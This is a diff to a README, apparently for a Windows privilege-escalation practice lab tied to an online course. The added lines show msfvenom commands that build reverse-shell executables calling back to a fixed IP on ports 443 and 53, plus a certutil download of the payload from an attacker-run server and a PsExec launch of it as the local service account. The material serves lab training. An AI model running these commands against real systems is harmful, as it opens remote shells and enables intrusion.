@@ -4,13 +4,28 @@
 
 Get a service account by exploiting or if you want to do a demo :
 
-Big Thanks to Tiberius for the awesome course. You can checkout his awesome course here. I couldnot have done without his help and setup :
+Big Thanks to Tiberius for the awesome WinPriv course. You can checkout his awesome course here. I couldnot have done without his help and it is his setup :
 https://www.udemy.com/course/windows-privilege-escalation/
 
 
 Binaries are in the folder called files.
 
 You have to login as the admin and then spawn a shell using the following command which can mimic the service account you get when you exploit a service to obtain a shell.
+
+To make the reverse executables:
+```zsh
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.11.238 LPORT=443 -f exe > reverse.exe
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.11.238 LPORT=53 -f exe > rev.exe
+
+```
+
+To transfer them start a python server where you have these executables and this on the Windows shell.
+
+```cmd
+certutil -urlcache -split -f http://YOURIPFORTHEVPN:PORT/reverse.exe
+```
+To obtain a mimiced service account:
 
 ```cmd
 C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
